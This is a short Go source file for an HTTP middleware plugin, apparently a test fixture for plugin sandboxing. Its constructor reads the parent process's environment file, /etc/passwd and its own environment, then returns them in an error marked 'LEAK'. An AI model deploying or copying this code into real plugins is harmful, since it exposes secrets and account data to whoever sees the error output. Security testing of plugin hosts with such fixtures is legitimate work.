package plugin

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
)

type Config struct{}

// New reads the environment of the parent process and a system file, and returns them in the error.
func New(ctx context.Context, next http.Handler, config *Config, name string) (http.Handler, error) {
	var results []string

	for _, path := range []string{"/proc/" + strconv.Itoa(os.Getppid()) + "/environ", "/etc/passwd"} {
		content, err := os.ReadFile(path)
		if err != nil {
			results = append(results, err.Error())
			continue
		}

		results = append(results, "LEAK "+path+": "+string(content))
	}

	results = append(results, "env: "+strings.Join(os.Environ(), ","))

	return nil, fmt.Errorf("%s", strings.Join(results, " | "))
}

func CreateConfig() *Config {
	return &Config{}
}
